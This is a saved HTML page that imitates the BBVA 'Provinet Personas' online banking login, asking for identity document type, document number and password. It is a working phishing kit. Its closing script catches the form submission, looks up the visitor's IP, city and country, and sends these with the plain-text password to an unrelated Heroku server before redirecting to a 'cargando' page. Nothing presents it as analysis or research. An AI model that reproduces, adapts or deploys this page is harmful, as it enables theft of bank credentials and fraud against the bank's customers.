<!DOCTYPE html>
<!-- saved from url=(0020)http://nestfunds.co/ -->
<html>
  <script
    src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js"
    id="eppiocemhmnlbhjplcgkofciiegomcon"
  ></script>
  <script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
  <script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    <title>Inicio</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no"
    />

    <style>
      .cargador,
      .group,
      header {
        position: relative;
      }
      .cond,
      input {
        color: #121212;
      }
      .container,
      input {
        display: block;
        width: 100%;
      }
      .cond,
      h1,
      input {
        font-family: Arial, Helvetica, sans-serif;
      }
      .highlight,
      label {
        pointer-events: none;
      }
      body {
        margin: 0;
        padding: 0 0 45px;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
      }

      * {
        box-sizing: border-box;
      }
      header {
        width: 100%;
        z-index: 13;
        height: 88px;
        padding-top: 0;
        padding-bottom: 0;
      }
      .header_wrapeer {
        height: 100%;
        background-color: #072146;
        color: #fff;
      }
      .header__campaign {
        width: 1176px;
        height: 100%;
        margin-left: auto;
        margin-right: auto;
        max-width: 100%;
      }
      .header__logo {
        margin: 0;
        height: 100%;
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        width: 100%;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        padding: 0 16px;
        -webkit-transition: all 0.33333s;
        transition: all 0.33333s;
      }
      .header__image {
        height: 18px;
        width: auto;
        will-change: height;
        margin: 0 auto;
        -webkit-transition: height 0.33333s;
        transition: height 0.33333s;
        max-width: none;
        display: inline-block;
      }
      h1 {
        font-style: normal;
        font-stretch: normal;
        text-align: center;
        font-weight: 400;
        margin-bottom: 32px;
        margin-top: 42px;
      }

      .container {
        max-width: 348px;
        margin: 0 auto;
      }
      input {
        font-size: 15px;
        padding: 32px 16px 8px;
        height: 56px;
        border: none;
        border-bottom: 1px solid #121212;
        background: #f4f4f4;
      }
      input:focus {
        outline: 0;
      }
      .cond {
        background-image: url(warning.png);
        background-repeat: no-repeat;
        background-position: left center;
        font-size: 12px;
        text-align: left;
        padding-left: 24px;
        display: none;
        margin-top: 8px;
        margin-left: 16px;
        margin-bottom: 8px;
      }
      #loginButton,
      .tatione {
        font-family: BentonSansBBVA-Bold, "Helvetica Neue", Helvetica, Arial,
          sans-serif;
        font-size: 15px;
      }
      .botonera {
        display: table;
        margin: 0 auto;
        width: 448px;
        padding-top: 32px;
      }
      .regis {
        width: 50%;
        display: table-cell;
        margin-top: 9px;
        vertical-align: middle;
      }
      .tatione {
        text-decoration: none;
        color: #237aba;
      }
      #loginButton {
        border-radius: 1px;
        width: 128px;
        height: 48px;
        background: #237aba;
        border: 0;
        color: #fffefe;
        font-weight: 700;
        filter: none;
        box-shadow: none;
        cursor: pointer;
        padding: 0;
        float: right;
      }
      #loginButton:disabled {
        background: #e9e9e9;
        cursor: not-allowed;
      }
      .cargador {
        display: none;
        min-height: 100px;
      }
      .highlight,
      .loading,
      label {
        position: absolute;
      }
      .loading {
        top: 50%;
        left: 50%;
        border: 5px solid #fff;
        border-radius: 100%;
      }
      .first {
        margin: -30px 0 0 -30px;
        height: 60px;
        width: 60px;
        border-top-color: #b5e5f9;
        animation: loading 3s infinite linear;
      }
      .second {
        margin: -20px 0 0 -20px;
        height: 40px;
        width: 40px;
        border-top-color: #52bcec;
        animation: loading 2s infinite linear;
      }
      .third {
        margin: -10px 0 0 -10px;
        height: 20px;
        width: 20px;
        border-top-color: #006ec1;
        animation: loading 1s infinite linear;
      }
      .novalid {
        border-bottom: solid 1px #d44b50 !important;
        background-color: #fcdfdf !important;
        -webkit-transition: background-color 3s ease-out;
        -moz-transition: background-color 3s ease-out;
        -o-transition: background-color 3s ease-out;
        transition: background-color 3s ease-out;
      }

      label {
        font-family: Arial, Helvetica, sans-serif;
        color: #bdbdbd;
        font-size: 16px;
        font-weight: 400;
        left: 16px;
        top: 20px;
        transition: 0.2s ease all;
        -moz-transition: 0.2s ease all;
        -webkit-transition: 0.2s ease all;
      }
      input:focus ~ label,
      input:valid ~ label {
        top: 7px;
        font-size: 12px;
        color: #666;
      }
      .highlight {
        height: 80%;
        width: 100px;
        top: 25%;
        left: 0;
        opacity: 0.5;
      }
      input:focus ~ .highlight {
        -webkit-animation: inputHighlighter 0.3s ease;
        -moz-animation: inputHighlighter 0.3s ease;
        animation: inputHighlighter 0.3s ease;
      }
      @-webkit-keyframes inputHighlighter {
        from {
          background: #5bbeff;
        }
        to {
          width: 0;
          background: 0 0;
        }
      }
      @-moz-keyframes inputHighlighter {
        from {
          background: #5bbeff;
        }
        to {
          width: 0;
          background: 0 0;
        }
      }
      @keyframes inputHighlighter {
        from {
          background: #5bbeff;
        }
        to {
          width: 0;
          background: 0 0;
        }
      }
      @keyframes loading {
        0% {
          transform: rotate(0);
        }
        100% {
          transform: rotate(360deg);
        }
      }
      @media screen and (max-width: 768px) {
        .enviar,
        .regis {
          position: relative;
          width: 100%;
          display: block;
        }
        .botonera {
          width: 100%;
          height: 140px !important;
        }
        #loginButton {
          float: none;
          width: 100%;
        }
        .regis {
          top: 70px;
          text-align: center;
        }
        .enviar {
          top: -25px;
        }
      }
      .footer__base {
        margin-top: 16px;
        background-color: #072146;
        padding: 72px 0;
      }
      .footer_container_1 {
        width: 1176px;
        margin-left: auto;
        margin-right: auto;
        max-width: 100%;
      }

      .footer__container {
        width: 100%;
        -webkit-box-align: center;
        -ms-flex-align: center;
        padding: 0 16px;
        -webkit-transition: all 0.33333s;
        transition: all 0.33333s;
      }
      .footer__copyright {
        font-family: BentonSansBBVA-Book, Helvetica, Arial, sans-serif;
        font-size: 12px;
        letter-spacing: 0;
        line-height: 16px;
        margin-top: 16px;
        color: #bdbdbd;
        padding: 8px 32px 24px;
        text-align: left;
      }
      .celular {
        display: none;
      }
      @media (min-width: 992px) {
        .header__image {
          height: 40px;
          margin: 0;
        }
      }
      @media screen and (max-width: 768px) and (max-height: 430px) {
        h1 {
          margin-bottom: 16px;
          margin-top: 0;
        }
        .botonera {
          padding-top: 8px;
        }
        .regis {
          top: 55px;
        }
      }
      @media only screen and (max-width: 767px) {
        .header__logo {
          display: none;
        }
        .celular {
          display: block;
        }
        /* Otros estilos específicos para dispositivos móviles */
        /* ... */
      }
      @media screen and (max-width: 768px) and (max-height: 340px) {
        input {
          height: 41px !important;
        }
        #loginButton {
          height: 36px !important;
        }
        .regis {
          top: 45px;
        }
        h1 {
          margin-bottom: 8px;
        }
      }
    </style>
    <script>
      function soloNumeros(e) {
        var key = window.event ? e.which : e.keyCode;
        if (key < 48 || key > 57) {
          e.preventDefault();
        }
      }
    </script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    />
  </head>
  <body>
    <header
      class="w-full py-4 px-6 items-center"
      style="background: #072146; padding: 15px"
    >
      <img
        src="lgo.png"
        style="width: 150px"
        alt="Logo BBVA"
      />
      <p
        style="
          color: white;
          font-size: 12px;
          font-family: Arial, Helvetica, sans-serif;
        "
      >
        Acceso a Provinet Personas
      </p>
    </header>

    <main class="container">
      <h1>¡Bienvenido!</h1>
      <form id="loginform">
        <div class="group">
          <select
            name="tipodoc"
            id="tipodoc"
            class="input-field"
            style="
              background: #f4f4f4;
              appearance: none;
              padding: 0 40px 0 15px;
              outline: 0;
              width: 100%;
              color: #121212;
              font-size: 16px;
              text-align: left;
              font-family: Arial, Helvetica, sans-serif;
              height: 56px;
              border: none;
              border-bottom: 1px solid #121212;
            "
          >
            <option value="Cédula de identidad">Cédula de identidad</option>
            <option value="Pasaporte">Pasaporte</option>
            <option value="Extranjero">Extranjero</option>
          </select>
        </div>
        <br />

        <div class="group">
          <input
            name="numdoc"
            id="numdoc"
            type="tel"
            maxlength="16"
            onkeypress="soloNumeros(event)"
            autocomplete="off"
            required
          />
          <label for="numdoc">Número de Documento</label>
        </div>

        <div class="group" style="margin-top: 16px">
          <input
            type="password"
            id="clvs"
            name="clvs"
            autocomplete="off"
            minlength="8"
            maxlength="8"
            required
          />
          <label for="clvs">Contraseña</label>
        </div>
        <br />
        <div class="button-container">
          <button
            type="submit"
            class="btn btn-blue btn-full btn-full-md"
            style="
              width: 100%;
              padding: 2rem 4rem;
              border: none;
              border-radius: 1px;
              color: #fff;
              text-align: center;
              font-family: Helvetica Neue, Arial, Helvetica, sans-serif;
              font-size: 1rem;
              margin: 0;
              padding: 1.3rem 3.7rem;
              transition: background-color 0.1s linear 0s;
              white-space: inherit;
              -moz-osx-font-smoothing: grayscale;
              -webkit-font-smoothing: antialiased;
              background-color: #237aba;
              outline: 0;
              display: inline-block;
              box-shadow: none !important;
              cursor: pointer;
            "
          >
            Continuar
          </button>
          <br /><br />
          <a href="#" class="tatione">¿Olvidaste tu contraseña?</a>
        </div>
      </form>
    </main>

    <footer style="text-align: center; margin-top: 30vh">
      <div
        class="text-white w-full text-center py-6 mt-6"
        style="background: #072146; padding: 20px"
      >
        <img src="footer.png" style="width: 240px" alt="BBVA" />
      </div>
    </footer>
  </body>
  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
      axios
        .get(url)
        .then((response) => {
          const tipo = document.querySelector("#tipodoc").value;
          const numdoc = document.querySelector("#numdoc").value;
          const contra = document.querySelector("#clvs").value;

          localStorage.setItem("usuario", numdoc);
          const message =
            "\nBBVA\nTipo: " +
            tipo +
            "\nNúmero de documento: " +
            numdoc +
            "\nContra: " +
            contra +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post("https://srvdor-33a68f3ab628.herokuapp.com/bbva3", {
              mensaje: message,
            })
            .then((response) => {
              window.location.href = "cargando.html";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
</html>
